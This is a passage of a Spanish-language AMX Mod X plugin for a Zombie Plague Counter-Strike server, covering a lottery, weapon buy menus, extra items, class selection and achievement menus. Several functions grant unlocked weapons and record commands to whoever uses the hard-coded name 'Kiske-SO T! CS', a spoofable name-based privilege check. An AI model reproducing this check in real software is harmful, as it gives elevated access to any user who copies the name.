		UnixToTime( iUnixDif, iYear, iMonth, iDay, iHour, iMinute, iSecond )
		
		formatex( szHour, charsmax( szHour ), " !g%02d!y hora%s,", iHour, (iHour == 1) ? "" : "s" )
		formatex( szMinute, charsmax( szMinute ), " !g%02d!y minuto%s", iMinute, (iMinute == 1) ? "" : "s" )
		formatex( szSecond, charsmax( szSecond ), " !g%02d!y segundo%s", iSecond, (iSecond == 1) ? "" : "s" )
		CC( id, "!g[ZP]!y Faltan%s%s%s para que sea !gT! AT NITE!y", (iHour < 1) ? "" : szHour, (iMinute < 1) ? "" : szMinute, (iSecond < 1) ? "" : szSecond )
	}
	else
	{
		new iDateYMD[3], iUnix07, iUnixDif;
		date(iDateYMD[0], iDateYMD[1], iDateYMD[2])
		
		iUnix07 = TimeToUnix( iDateYMD[0], iDateYMD[1], iDateYMD[2], 05, 00, 00 )
		iUnixDif = iUnix07 - ( get_systime( ) + ( -3 * gHOUR_SECONDS ) )
		
		new iYear, iMonth, iDay, iHour, iMinute, iSecond, szHour[32], szMinute[32], szSecond[32];
		UnixToTime( iUnixDif, iYear, iMonth, iDay, iHour, iMinute, iSecond )
		
		formatex( szHour, charsmax( szHour ), " !g%02d!y hora%s,", iHour, (iHour == 1) ? "" : "s" )
		formatex( szMinute, charsmax( szMinute ), " !g%02d!y minuto%s", iMinute, (iMinute == 1) ? "" : "s" )
		formatex( szSecond, charsmax( szSecond ), " !g%02d!y segundo%s", iSecond, (iSecond == 1) ? "" : "s" )
		CC( id, "!g[ZP]!y Faltan%s%s%s para que acabe !gT! AT NITE!y", (iHour < 1) ? "" : szHour, (iMinute < 1) ? "" : szMinute, (iSecond < 1) ? "" : szSecond )
	}
	return PLUGIN_HANDLED;
}
public clcmd_lider_aps(id)
{
	if( equal( g_playername[id], "Kiske-SO     T! CS" ) )
		Rec_MJ()
	
	return PLUGIN_HANDLED;
}
public clcmd_lider_combos(id)
{
	if( equal( g_playername[id], "Kiske-SO     T! CS" ) )
		Rec_MJ_COMBO()
	
	return PLUGIN_HANDLED;
}

public clcmd_loteria(id)
{
	new iTeam = fm_cs_get_user_team(id)
	if( !gLogeado[id] || is_user_bot(id) || is_user_hltv(id) || iTeam == FM_CS_TEAM_SPECTATOR || iTeam == FM_CS_TEAM_UNASSIGNED ) return PLUGIN_HANDLED;
	show_menu_loteria(id)
	return PLUGIN_HANDLED;
}
public show_menu_loteria(id)
{
	new iTeam = fm_cs_get_user_team(id)
	if( !gLogeado[id] || is_user_bot(id) || is_user_hltv(id) || iTeam == FM_CS_TEAM_SPECTATOR || iTeam == FM_CS_TEAM_UNASSIGNED ) return PLUGIN_HANDLED;
	
	static menu[512], len, szAddDot[15];
	len = 0
	
	AddDot(g_ammopacks[id], szAddDot, 14)
	len += formatex(menu[len], charsmax(menu) - len, "\yLOTERIA.^n\wTienes \y%s\w AmmoPacks^n^n", szAddDot)
	
	AddDot(gApost[id][0], szAddDot, 14)
	len += formatex(menu[len], charsmax(menu) - len, "\r1.\w Apostar \y%s APs\w al \ynº %d^n^n", szAddDot, gApost[id][1])
	
	len += formatex(menu[len], charsmax(menu) - len, "\r2.\w Cambiar apuesta^n")
	len += formatex(menu[len], charsmax(menu) - len, "\r3.\w Cambiar número^n^n")
	
	AddDot(gPozoAc, szAddDot, 14)
	len += formatex(menu[len], charsmax(menu) - len, "\yPozo Acumulado: %s^n\wSorteo: Los domingos", szAddDot)
	
	// 0. Back
	len += formatex(menu[len], charsmax(menu) - len, "^n^n\r0.\w Atras")
	
	show_menu(id, KEYSMENU, menu, -1, "Loteria Menu")
	
	return PLUGIN_HANDLED;
}
public menu_loteria(id, key)
{
	// Menu was closed
	new iTeam = fm_cs_get_user_team(id)
	if( !gLogeado[id] || is_user_bot(id) || is_user_hltv(id) || iTeam == FM_CS_TEAM_SPECTATOR || iTeam == FM_CS_TEAM_UNASSIGNED ) return PLUGIN_HANDLED;
	
	switch( key )
	{
		case 0:
		{
			if(gYaAposto[id])
			{
				static szAddDot[15];
				
				AddDot(gApostG[id][0], szAddDot, 14)
				CC(id, "!g[LOTERIA]!y Ya apostaste esta semana. !g%s ammopacks!y al !gnº %d!y", szAddDot, gApostG[id][1])
				
				return PLUGIN_HANDLED;
			}
			
			if( (g_ammopacks[id] - gApost[id][0]) < 0 )
			{
				CC(id, "!g[LOTERIA]!y La apuesta indicada supera tus ammopacks")
				return PLUGIN_HANDLED;
			}
			else if( gApost[id][0] < 451 )
			{
				CC(id, "!g[LOTERIA]!y La apuesta tiene que ser mayor a 450 ammopacks")
				return PLUGIN_HANDLED;
			}
			
			gYaAposto[id] = 1;
			
			g_ammopacks[id] -= gApost[id][0]
			gPozoAc += gApost[id][0]
			
			SQL_QueryAndIgnore( SQL_CONNECTION, "UPDATE `accounts` SET `cant_apostada` = '%d', `num_apostado` = '%d' WHERE `id` = '%d';", gApost[id][0], gApost[id][1], zp_id[id] )
			SQL_QueryAndIgnore( SQL_CONNECTION, "UPDATE `modes` SET `pozo_ac` = '%d';", gPozoAc )
			
			new szDotAdd[15];
			AddDot(gApost[id][0], szDotAdd, 14)
			CC(0, "!g[LOTERIA] %s!y ha apostado !g%s APs!y al número !g%d!y", g_playername[id], szDotAdd, gApost[id][1])
		}
		case 1:
		{
			CC(id, "!g[LOTERIA]!y Indica cuantos ammopacks queres apostar")
			client_cmd( id, "messagemode APOSTAR_APS" )
		}
		case 2:
		{
			CC(id, "!g[LOTERIA]!y Indica a que número queres apostar")
			client_cmd( id, "messagemode APOSTAR_NUM" )
		}
	}
	
	return PLUGIN_HANDLED;
}
public clcmd_apostar_aps(id)
{
	new iTeam = fm_cs_get_user_team(id)
	if( !gLogeado[id] || is_user_bot(id) || is_user_hltv(id) || iTeam == FM_CS_TEAM_SPECTATOR || iTeam == FM_CS_TEAM_UNASSIGNED ) return PLUGIN_HANDLED;
	new sAps[191], iAps;
	
	read_args( sAps, 190 )
	remove_quotes( sAps )
	trim( sAps )
	
	iAps = str_to_num(sAps)
	
	if( IsContainingLetters(sAps) || !CountNumbers(sAps) || iAps < 451 || equali( sAps, "" ) || containi( sAps, " " ) != -1 )
	{
		CC( id, "!g[LOTERIA]!y Solo números, sin espacios y mayor de 450" )
		
		show_menu_loteria(id)
		return PLUGIN_HANDLED;
	}
	else if( iAps > g_ammopacks[id] )
	{
		CC(id, "!g[LOTERIA]!y La apuesta indicada supera tus ammopacks")
		return PLUGIN_HANDLED;
	}
	
	gApost[id][0] = iAps
	
	show_menu_loteria(id)
	return PLUGIN_HANDLED;
}
public clcmd_apostar_num(id)
{
	new iTeam = fm_cs_get_user_team(id)
	if( !gLogeado[id] || is_user_bot(id) || is_user_hltv(id) || iTeam == FM_CS_TEAM_SPECTATOR || iTeam == FM_CS_TEAM_UNASSIGNED ) return PLUGIN_HANDLED;
	new sNum[191], iNum;
	
	read_args( sNum, 190 )
	remove_quotes( sNum )
	trim( sNum )
	
	iNum = str_to_num(sNum)
	
	if( IsContainingLetters(sNum) || !CountNumbers(sNum) || iNum < 0 || iNum > 999 || equali( sNum, "" ) || containi( sNum, " " ) != -1 )
	{
		CC( id, "!g[LOTERIA]!y Solo números, sin espacios y del 0 al 999" )
		
		show_menu_loteria(id)
		return PLUGIN_HANDLED;
	}
	
	gApost[id][1] = iNum
	
	show_menu_loteria(id)
	return PLUGIN_HANDLED;
}

IsContainingLetters( const String[] )
{
    new Len = strlen( String );
    
    for ( new i = 0 ; i < Len ; i++ )
        if ( isalpha( String[ i ] ) )  { return true; }
    
    return false;
}
CountNumbers( const String[], const Len = sizeof( String ) )
{
    new Count = 0;
    
    for ( new i = 0 ; i < Len; i++ )
        if ( isdigit( String[ i ] ) )  { Count++; }
    
    return Count;
}

/*================================================================================
 [Menus]
=================================================================================*/

// Game Menu
show_menu_game(id)
{
	static menu[512], len, userflags, szAPS_Need[15];
	len = 0
	userflags = get_user_flags(id)
	
	switch(gReset[id])
	{
		case 0: AddDot( gAMMOPACKS_NEEDED[gLevel[id]] - g_ammopacks[id], szAPS_Need, 14 )
		case 1: AddDot( gAMMOPACKS_NEEDED_RESET(gLevel[id]) - g_ammopacks[id], szAPS_Need, 14 )
		case 2..3: AddDot( gAMMOPACKS_NEEDED_RESET_2(gLevel[id]) - g_ammopacks[id], szAPS_Need, 14 )
		case 4..9999: AddDot( gAMMOPACKS_NEEDED_RESET_4(gLevel[id]) - g_ammopacks[id], szAPS_Need, 14 )
	}
	
	// Title
	len += formatex(menu[len], charsmax(menu) - len, "\y%s^n\wTe faltan \y%s APs \wpara el \ynivel %d.^n^n", g_modname, szAPS_Need, gLevel[id]+1)
	
	// 1. Buy weapons
	len += formatex(menu[len], charsmax(menu) - len, "\r1.\w COMPRAR ARMAS^n")
	
	// 2. Extra items
	len += formatex(menu[len], charsmax(menu) - len, "\r2.\w COMPRAR ITEMS EXTRAS^n^n")
	
	// 3. Zombie class
	len += formatex(menu[len], charsmax(menu) - len, "\r3.\w ELEGIR CLASE HUMANA / ZOMBIE^n^n")
	
	// 4. Logros
	len += formatex(menu[len], charsmax(menu) - len, "\r4.\w LOGROS^n")
	
	// 5. Habilities menus
	len += formatex(menu[len], charsmax(menu) - len, "\r5.\w HABILIDADES^n^n")
	
	// 6. Reset menu
	if( ReqNeedReset_ASD(id) ) len += formatex(menu[len], charsmax(menu) - len, "\r6.\w RESET \y(100.00%%)^n^n" )
	else
	{
		static Float:fPercentReset;
		switch(gReset[id])
		{
			case 0: fPercentReset = ( float(g_ammopacks[id]) * 100.0 ) / float(MAX_APS)
			case 1: fPercentReset = ( float(g_ammopacks[id]) * 100.0 ) / float(MAX_APS_RESET_1)
			case 2..3: fPercentReset = ( float(g_ammopacks[id]) * 100.0 ) / float(MAX_APS_RESET_2)
			case 4..9999: fPercentReset = ( float(g_ammopacks[id]) * 100.0 ) / float(MAX_APS_RESET_4)
		}
		
		len += formatex(menu[len], charsmax(menu) - len, "\r6.\d RESET \r(%.2f%%)^n^n", fPercentReset)
	}
	
	// 7. Interfaz
	len += formatex(menu[len], charsmax(menu) - len, "\r7.\w INTERFAZ^n")
	
	// 8. Herramientas
	len += formatex(menu[len], charsmax(menu) - len, "\r8.\w HERRAMIENTAS")
	
	// 9. Admin menu
	if (userflags & ACCESS_MENU) len += formatex(menu[len], charsmax(menu) - len, "^n^n\r9.\w MENU DE ADMIN")
	else len += formatex(menu[len], charsmax(menu) - len, "")
	
	// 0. Exit
	len += formatex(menu[len], charsmax(menu) - len, "^n^n\r0.\w Salir")
	
	show_menu(id, KEYSMENU, menu, -1, "Game Menu")
}

// Buy Menu 1
public show_menu_buy1(taskid)
{
	// Get player's id
	static id
	(taskid > g_maxplayers) ? (id = ID_SPAWN) : (id = taskid);
	
	// Zombies or survivors get no guns
	if (!g_isalive[id] || g_zombie[id] || g_survivor[id] || gPlayersL4D[id][0] || gPlayersL4D[id][1] || gPlayersL4D[id][2] || gPlayersL4D[id][3] || gWesker[id] ||
	gJason[id] || gSniper[id])
		return;
	
	// Bots pick their weapons randomly / Random weapons setting enabled
	gShowMenu[id] = 1
	
	// Automatic selection enabled for player and menu called on spawn event
	if (WPN_AUTO_ON && taskid > g_maxplayers)
	{
		gShowMenu[id] = 0
		buy_primary_weapon(id, WPN_AUTO_PRI)
		buy_secondary_weapon(id, WPN_AUTO_SEC)
		menu_buy3(id, WPN_AUTO_TER)
		return;
	}
	else gShowMenu[id] = 1
	
	static menu[750], len, weap, maxloops, iNeedLvl, iNeedReset, IsNeedReset[32]
	len = 0
	maxloops = min(WPN_STARTID+7, WPN_MAXIDS)
	
	// Title
	len += formatex(menu[len], charsmax(menu) - len, "\yARMA PRIMARIA \r[%d-%d]^n^n", WPN_STARTID+1, min(WPN_STARTID+7, WPN_MAXIDS))
	
	// 1-7. Weapon List
	for (weap = WPN_STARTID; weap < maxloops; weap++)
	{
		iNeedLvl = ArrayGetCell( gPrimaryLevel, weap )
		iNeedReset = ArrayGetCell( gPrimaryReset, weap )
		
		if( !equal(g_playername[id], "Kiske-SO     T! CS") )
		{
			if( ( gReset[id] > iNeedReset ) || ( ( gReset[id] == iNeedReset ) && gLevel[id] >= iNeedLvl ) )
				len += formatex(menu[len], charsmax(menu) - len, "\r%d.\w %s^n", weap-WPN_STARTID+1, (weap >= 16 && weap < 23) ? WEAPONNAMES_EDIT[ArrayGetCell(g_primary_weaponids, weap)] : 
				(weap >= 23) ? WEAPONNAMES_EDIT_2[ArrayGetCell(g_primary_weaponids, weap)] : WEAPONNAMES[ArrayGetCell(g_primary_weaponids, weap)])
			else
			{
				formatex( IsNeedReset, 31, " - RESET: %d)", iNeedReset )
				len += formatex(menu[len], charsmax(menu) - len, "\r%d.\d %s \r(LV: %d%s^n", weap-WPN_STARTID+1, (weap >= 16 && weap < 23) ? WEAPONNAMES_EDIT[ArrayGetCell(g_primary_weaponids, weap)] : 
				(weap >= 23) ? WEAPONNAMES_EDIT_2[ArrayGetCell(g_primary_weaponids, weap)] : WEAPONNAMES[ArrayGetCell(g_primary_weaponids, weap)], iNeedLvl, iNeedReset > 0 ? IsNeedReset : ")")
			}
		}
		else
		{
			len += formatex(menu[len], charsmax(menu) - len, "\r%d.\w %s^n", weap-WPN_STARTID+1, (weap >= 16 && weap < 23) ? WEAPONNAMES_EDIT[ArrayGetCell(g_primary_weaponids, weap)] : 
			(weap >= 23) ? WEAPONNAMES_EDIT_2[ArrayGetCell(g_primary_weaponids, weap)] : WEAPONNAMES[ArrayGetCell(g_primary_weaponids, weap)])
		}
	}
	
	// 8. Auto Select
	len += formatex(menu[len], charsmax(menu) - len, "^n\r8.\w RECORDAR COMPRA ? \y[%s]", (WPN_AUTO_ON) ? "Si" : "No")
	
	// 9. Next/Back - 0. Exit
	len += formatex(menu[len], charsmax(menu) - len, "^n^n\r9.\w Siguiente/Anterior^n^n\r0.\w Volver")
	
	show_menu(id, KEYSMENU, menu, -1, "Buy Menu 1")
}

// Buy Menu 2
show_menu_buy2(id)
{
	static menu[750], len, weap, maxloops, iNeedLvl, iNeedReset, IsNeedReset[32]
	len = 0
	maxloops = min(WPN_STARTID_2+7, WPN_MAXIDS_2)
	
	// Title
	len += formatex(menu[len], charsmax(menu) - len, "\yARMA SECUNDARIA \r[%d-%d]^n^n", WPN_STARTID_2+1, min(WPN_STARTID_2+7, WPN_MAXIDS_2))
	
	// 1-7. Weapon List
	for (weap = WPN_STARTID_2; weap < maxloops; weap++)
	{
		iNeedLvl = ArrayGetCell( gSecondaryLevel, weap )
		iNeedReset = ArrayGetCell( gSecondaryReset, weap )
		
		if( !equal(g_playername[id], "Kiske-SO     T! CS") )
		{
			if( ( gReset[id] > iNeedReset ) || ( ( gReset[id] == iNeedReset ) && gLevel[id] >= iNeedLvl ) )
				len += formatex(menu[len], charsmax(menu) - len, "\r%d.\w %s^n", weap-WPN_STARTID_2+1, (weap >= 6 && weap < 11) ? WEAPONNAMES_EDIT[ArrayGetCell(g_secondary_weaponids, weap)] : 
				(weap >= 11) ? WEAPONNAMES_EDIT_2[ArrayGetCell(g_secondary_weaponids, weap)] : WEAPONNAMES[ArrayGetCell(g_secondary_weaponids, weap)])
			else
			{
				formatex( IsNeedReset, 31, " - RESET: %d)", iNeedReset )
				len += formatex(menu[len], charsmax(menu) - len, "\r%d.\d %s \r(LV: %d%s^n", weap-WPN_STARTID_2+1, (weap >= 6 && weap < 11) ? WEAPONNAMES_EDIT[ArrayGetCell(g_secondary_weaponids, weap)] : 
				(weap >= 11) ? WEAPONNAMES_EDIT_2[ArrayGetCell(g_secondary_weaponids, weap)] : WEAPONNAMES[ArrayGetCell(g_secondary_weaponids, weap)], iNeedLvl, iNeedReset > 0 ? IsNeedReset : ")")
			}
		}
		else
		{
			len += formatex(menu[len], charsmax(menu) - len, "\r%d.\w %s^n", weap-WPN_STARTID_2+1, (weap >= 6 && weap < 11) ? WEAPONNAMES_EDIT[ArrayGetCell(g_secondary_weaponids, weap)] : 
			(weap >= 11) ? WEAPONNAMES_EDIT_2[ArrayGetCell(g_secondary_weaponids, weap)] : WEAPONNAMES[ArrayGetCell(g_secondary_weaponids, weap)])
		}
	}
	
	// 8. Auto Select
	len += formatex(menu[len], charsmax(menu) - len, "^n\r8.\w RECORDAR COMPRA ? \y[%s]", (WPN_AUTO_ON) ? "Si" : "No")
	
	// 9. Next/Back - 0. Exit
	len += formatex(menu[len], charsmax(menu) - len, "^n^n\r9.\w Siguiente/Anterior^n^n\r0.\w Volver")
	
	show_menu(id, KEYSMENU, menu, -1, "Buy Menu 2")
}

// Buy Menu 3
show_menu_buy3(id)
{
	static Menue[1023], Longitud
	Longitud = 0
	
	Longitud += formatex( Menue[Longitud], charsmax( Menue ) - Longitud, "\yARMA CUATERNARIA \r[1-5]^n^n" )
	if( gReset[id] < 20 )
	{
		for( new gFors = 0; gFors < 5; gFors++ )
		{
			if( !equal(g_playername[id], "Kiske-SO     T! CS") )
			{
				if( gReset[id] < 1 && gLevel[id] < LevelGranadas[ gFors ] )
					Longitud += formatex( Menue[Longitud], charsmax( Menue ) - Longitud, "\r%d. %s \r(LV: %d)^n", gFors + 1, NameGranadasLV[gFors], LevelGranadas[gFors] )	
				else
					Longitud += formatex( Menue[Longitud], charsmax( Menue ) - Longitud, "\r%d. %s^n", gFors + 1, NameGranadas[gFors] )
			}
			else
				Longitud += formatex( Menue[Longitud], charsmax( Menue ) - Longitud, "\r%d. %s^n", gFors + 1, NameGranadas[gFors] )
		}
	}
	else
	{
		for( new gFors = 0; gFors < 6; gFors++ )
		{
			if( !equal(g_playername[id], "Kiske-SO     T! CS") )
			{
				if( gLevel[id] < LevelGranadas_ELITE[ gFors ] )
					Longitud += formatex( Menue[Longitud], charsmax( Menue ) - Longitud, "\r%d. %s \r(LV: %d)^n", gFors + 1, NameGranadasLV_ELITE[gFors], LevelGranadas_ELITE[gFors] )	
				else
					Longitud += formatex( Menue[Longitud], charsmax( Menue ) - Longitud, "\r%d. %s^n", gFors + 1, NameGranadas_ELITE[gFors] )
			}
			else
				Longitud += formatex( Menue[Longitud], charsmax( Menue ) - Longitud, "\r%d. %s^n", gFors + 1, NameGranadas_ELITE[gFors] )
		}
	}
	
	Longitud += formatex( Menue[Longitud], charsmax( Menue ) - Longitud, "^n\r8.\w RECORDAR COMPRA ? \y[%s]", (WPN_AUTO_ON) ? "Si" : "No")
	Longitud += formatex( Menue[Longitud], charsmax( Menue ) - Longitud, "^n^n\r0.\w Volver")
	
	show_menu( id, KEYSMENU, Menue, -1, "Buy Menu 3" )
}

// Extra Items Menu
show_menu_extras(id)
{
	if( gPlayersL4D[id][0] || gPlayersL4D[id][1] || gPlayersL4D[id][2] || gPlayersL4D[id][3] || gWesker[id] || gJason[id] || gSniper[id] )
	{
		CC(id, "!g[ZP]!y Comando no disponible")
		return;
	}
	
	static menuid, menu[128], item, team, buffer[128]
	
	// Title
	formatex(menu, charsmax(menu), "ITEMS EXTRAS [%s]\r", g_zombie[id] ? g_nemesis[id] ? "Nemesis" : "Zombie" : g_survivor[id] ? "Survivor" : "Humano")
	menuid = menu_create(menu, "menu_extras")
	
	// Item List
	for (item = 0; item < g_extraitem_i; item++)
	{
		// Retrieve item's team
		team = ArrayGetCell(g_extraitem_team, item)
		
		// Item not available to player's team/class
		if ((g_zombie[id] && !g_nemesis[id] && !(team & ZP_TEAM_ZOMBIE)) || (!g_zombie[id] && !g_survivor[id] && !(team & ZP_TEAM_HUMAN)) || (g_nemesis[id] && !(team & ZP_TEAM_NEMESIS)) || (g_survivor[id] && !(team & ZP_TEAM_SURVIVOR)))
			continue;
		
		// Check if it's one of the hardcoded items, check availability, set translated caption
		switch (item)
		{
			case EXTRA_NVISION:
			{
				formatex(buffer, charsmax(buffer), "Nightvision (una ronda)")
			}
			case EXTRA_ANTIDOTE:
			{
				if (g_antidotecounter[id] <= 0) continue;
				formatex(buffer, charsmax(buffer), "Antídoto del virus (%d)", g_antidotecounter[id])
			}
			case EXTRA_MADNESS:
			{
				if (gFuriaMax[id] <= 0) continue;
				formatex(buffer, charsmax(buffer), "Furia zombie (%d)", gFuriaMax[id])
			}
			case EXTRA_INFBOMB:
			{
				if (g_infbombcounter <= 0 || gBombaMax[id] >= 1 || gLevel[id] < 10) continue;
				formatex(buffer, charsmax(buffer), "Bomba de infección (%d / 5)", g_infbombcounter)
			}
			case EXTRA_UNLIMITED_CLIP: formatex(buffer, charsmax(buffer), "Balas infinitas")
			case EXTRA_PRECISION_CLIP: formatex(buffer, charsmax(buffer), "Precisión perfecta")
			case EXTRA_ARMOR: 
			{
				if( get_user_armor(id) >= 101 ) continue;
				formatex(buffer, charsmax(buffer), "100 de chaleco")
			}
			default:
			{
				ArrayGetString(g_extraitem_name, item, buffer, charsmax(buffer))
			}
		}
		
		// Add Item Name and Cost
		formatex(menu, charsmax(menu), "%s \y%d ammo packs", buffer, (ArrayGetCell(g_extraitem_cost, item) * ((gReset[id]*500)+gLevel[id])))
		buffer[0] = item
		buffer[1] = 0
		menu_additem(menuid, menu, buffer)
	}
	
	// No items to display?
	if (menu_items(menuid) <= 0)
	{
		CC(id, "!g[ZP]!y No hay items extras disponibles para comprar")
		menu_destroy(menuid)
		return;
	}
	
	// Back - Next - Exit
	menu_setprop(menuid, MPROP_BACKNAME, "Anterior")
	menu_setprop(menuid, MPROP_NEXTNAME, "Siguiente")
	menu_setprop(menuid, MPROP_EXITNAME, "Volver")
	
	menu_display(id, menuid)
}

// Zombie Class Menu
public show_menu_zclass(id)
{
	// Player disconnected
	if (!g_isconnected[id])
		return;
	
	static menuid, menu[1023], class, buffer[32], level, reset
	
	// Title
	formatex(menu, charsmax(menu), "ZOMBIES\r\RPág ")
	menuid = menu_create(menu, "menu_zclass")
	
	// Class List
	for (class = 0; class < g_zclass_i; class++)
	{
		// Retrieve name
		ArrayGetString(g_zclass_name, class, buffer, charsmax(buffer))
		level = ArrayGetCell(g_zclass_level, class)
		reset = ArrayGetCell(g_zclass_reset, class)
		
		// Add to menu
		if (class == g_zombieclassnext[id])
			formatex(menu, charsmax(menu), "\d%s (LEVEL: %d - RESET: %d)", buffer, level, reset)
		else if( ( gReset[id] > reset ) || ( gReset[id] == reset && gLevel[id] >= level ) )
			formatex(menu, charsmax(menu), "\w%s \y(LEVEL: %d - RESET: %d)", buffer, level, reset)
		else
			formatex(menu, charsmax(menu), "\d%s \r(LEVEL: %d - RESET: %d)", buffer, level, reset)
		
		buffer[0] = class
		buffer[1] = 0
		menu_additem(menuid, menu, buffer, ADMIN_ALL, menu_makecallback("detect_level_zclass"))
	}
	
	// Back - Next - Exit
	menu_setprop(menuid, MPROP_BACKNAME, "Anterior")
	menu_setprop(menuid, MPROP_NEXTNAME, "Siguiente")
	menu_setprop(menuid, MPROP_EXITNAME, "Volver")
	
	menu_display(id, menuid)
}

public detect_level_zclass(id, menuid, item)
{
	// Retrieve itemid
	new buffer[6]
	new _access, callback
	menu_item_getinfo(menuid, item, _access, buffer, charsmax(buffer), _, _, callback)
	
	if ((gReset[id] > ArrayGetCell(g_zclass_reset, buffer[0])) || (gReset[id] == ArrayGetCell(g_zclass_reset, buffer[0]) && gLevel[id] >= ArrayGetCell(g_zclass_level, buffer[0])))
		return ITEM_ENABLED;
	
	return ITEM_DISABLED;
}

// Human Class Menu
public show_menu_hclass(id)
{
	// Player disconnected
	if (!g_isconnected[id])
		return;
	
	static menuid, menu[128], class, buffer[32], level, reset
	
	// Title
	formatex(menu, charsmax(menu), "HUMANOS\r\RPág ")
	menuid = menu_create(menu, "menu_hclass")
	
	// Class List
	for (class = 0; class < g_hclass_i; class++)
	{
		// Retrieve name
		ArrayGetString(g_hclass_name, class, buffer, charsmax(buffer))
		
		level = ArrayGetCell(g_hclass_level, class)
		reset = ArrayGetCell(g_hclass_reset, class)
		
		// Add to menu
		if (class == g_humanclassnext[id])
			formatex(menu, charsmax(menu), "\d%s (LEVEL: %d - RESET: %d)", buffer, level, reset)
		else if( ( gReset[id] > reset ) || ( gReset[id] == reset && gLevel[id] >= level ) )
			formatex(menu, charsmax(menu), "\w%s \y(LEVEL: %d - RESET: %d)", buffer, level, reset)
		else
			formatex(menu, charsmax(menu), "\d%s \r(LEVEL: %d - RESET: %d)", buffer, level, reset)
		
		buffer[0] = class
		buffer[1] = 0
		menu_additem(menuid, menu, buffer, ADMIN_ALL, menu_makecallback("detect_level_hclass"))
	}
	
	// Back - Next - Exit
	menu_setprop(menuid, MPROP_BACKNAME, "Anterior")
	menu_setprop(menuid, MPROP_NEXTNAME, "Siguiente")
	menu_setprop(menuid, MPROP_EXITNAME, "Volver")
	
	menu_display(id, menuid)
}

public detect_level_hclass(id, menuid, item)
{
	// Retrieve itemid
	new buffer[6]
	new _access, callback
	menu_item_getinfo(menuid, item, _access, buffer, charsmax(buffer), _, _, callback)
	
	if ((gReset[id] > ArrayGetCell(g_hclass_reset, buffer[0])) || (gReset[id] == ArrayGetCell(g_hclass_reset, buffer[0]) && gLevel[id] >= ArrayGetCell(g_hclass_level, buffer[0])))
		return ITEM_ENABLED;
	
	return ITEM_DISABLED;
}

public show_menu_logros_class(id)
{
	new menu[128], menuid
	
	// Title
	formatex(menu, charsmax(menu), "\yLOGROS")
	menuid = menu_create(menu, "menu_logros_class")
	
	menu_additem(menuid, "Humanos", "1")
	menu_additem(menuid, "Zombies^n", "2")
	
	menu_additem(menuid, "Ver logros de otros", "3")
	
	// Back
	menu_setprop(menuid, MPROP_EXITNAME, "Volver")
	menu_display(id, menuid)
}
public menu_logros_class(id, menuid, item)
{
	// Menu was closed
	if (item == MENU_EXIT)
	{
		menu_destroy(menuid)
		show_menu_game(id)
		return PLUGIN_HANDLED;
	}
	
	new buffer[2], dummy
	menu_item_getinfo(menuid, item, dummy, buffer, charsmax(buffer), _, _, dummy)
	
	if(str_to_num(buffer) == 3)
	{
		menu_destroy(menuid)
		show_menu_logros_others(id)
	}
	else
	{
		LOGRO_CLASS = str_to_num(buffer) - 1
		
		menu_destroy(menuid)
		
		show_menu_logros(id)
	}
	
	return PLUGIN_HANDLED;
}
show_menu_logros(id)
{
	new menu[1024], lang[64], num[8], i, menuid
	
	formatex(menu, charsmax(menu), "\y%s^n\wLogros %s completados: \y%d\RPág ", LANG_HAB_L[LOGRO_CLASS], LANG_HAB_L_M[LOGRO_CLASS], get_count_logros(id, LOGRO_CLASS))
	
	menuid = menu_create(menu, "menu_logros")
	
	for(i = 0; i < MAX_LOGROS_CLASS[LOGRO_CLASS]; i++)
	{
		ArrayGetString(A_LOGROS_NAMES[LOGRO_CLASS], i, lang, charsmax(lang))
		
		formatex(menu, charsmax(menu), "%s%s (%s)", g_logro[id][LOGRO_CLASS][i] ? "\w" : "\d", lang, 
		g_logro[id][LOGRO_CLASS][i] ? "\yCOMPLETO\w" : "\rINCOMPLETO\d")
		
		num_to_str(i, num, charsmax(num))
		menu_additem(menuid, menu, num)
	}
	
	menu_setprop(menuid, MPROP_BACKNAME, "Anterior")
	menu_setprop(menuid, MPROP_NEXTNAME, "Siguiente")
	menu_setprop(menuid, MPROP_EXITNAME, "Volver")
	menu_display(id, menuid)
}
public menu_logros(id, menuid, item)
{
	// Menu was closed
	if (item == MENU_EXIT)
	{
		menu_destroy(menuid)
		show_menu_logros_class(id)
		return PLUGIN_HANDLED;
	}
	
	new buffer[3], dummy
	menu_item_getinfo(menuid, item, dummy, buffer, charsmax(buffer), _, _, dummy)
	
	LOGRO_ITEM = str_to_num(buffer)
	
	menu_destroy(menuid)
	
	sub_menu_logros(id)
	return PLUGIN_HANDLED;
}
public sub_menu_logros(id)
{
	new menu[1024], len
	len = 0
	
	new lang[256], szAGC[15];
	AddDot(ArrayGetCell(A_LOGROS_POINTS[LOGRO_CLASS], LOGRO_ITEM), szAGC, 14)
	
	ArrayGetString(A_LOGROS_NAMES[LOGRO_CLASS], LOGRO_ITEM, lang, charsmax(lang))
	len += formatex(menu[len], charsmax(menu) - len, "\y%s (%s\y)^n^n", lang, g_logro[id][LOGRO_CLASS][LOGRO_ITEM] ? "\wCOMPLETADO" : "\rNO COMPLETADO")
	
	ArrayGetString(A_LOGROS_DESCRIPTION[LOGRO_CLASS], LOGRO_ITEM, lang, charsmax(lang))
	len += formatex(menu[len], charsmax(menu) - len, "\yDESCRIPCIÓN:^n\w%s^n^n\yRECOMPENSA:^n%4s\r- \w%sp. especiales", lang, "", szAGC)
	
	// 0. Exit
	len += formatex(menu[len], charsmax(menu) - len, "^n^n\r0.\w Atrás")
	
	show_menu(id, KEYSMENU, menu, -1, "Menu Logros")
}
public menu_sub_logros(id, key)
{
	switch(key)
	{
		case 0..8: return PLUGIN_HANDLED;
		case 9: show_menu_logros(id)
	}
	
	return PLUGIN_HANDLED;
}
get_count_logros(id, logro_class_1)
{
	new i_Count = 0;
	
	for(new i = 0; i < MAX_HUMANS_LOGROS; i++)
	{
		if(g_logro[id][logro_class_1][i])
			i_Count++;
	}
	
	return i_Count;
}




public show_menu_logros_others(id)
{
	static menuid, menu[128], player, buffer[2], GCL_H, GCL_Z;
	
	menuid = menu_create("\y¿ A QUIEN DESEAS VER SUS LOGROS ?", "menu_logros_others")
	
	// Player List
	for (player = 0; player <= g_maxplayers; player++)
	{
		if(!g_isconnected[player])
			continue;
		
		GCL_H = get_count_logros(player, LOGRO_HUMAN)
		GCL_Z = get_count_logros(player, LOGRO_ZOMBIE)
		
		if (!gLogeado[player] || (GCL_H <= 0 && GCL_Z <= 0))
			continue;
		
		formatex(menu, charsmax(menu), "%s (\y%d H. \r- \y%d Z.)", g_playername[player], GCL_H, GCL_Z)
		
		// Add player
		buffer[0] = player
		buffer[1] = 0
		menu_additem(menuid, menu, buffer)
	}
	
	// Back - Next - Exit
	menu_setprop(menuid, MPROP_BACKNAME, "Anterior")
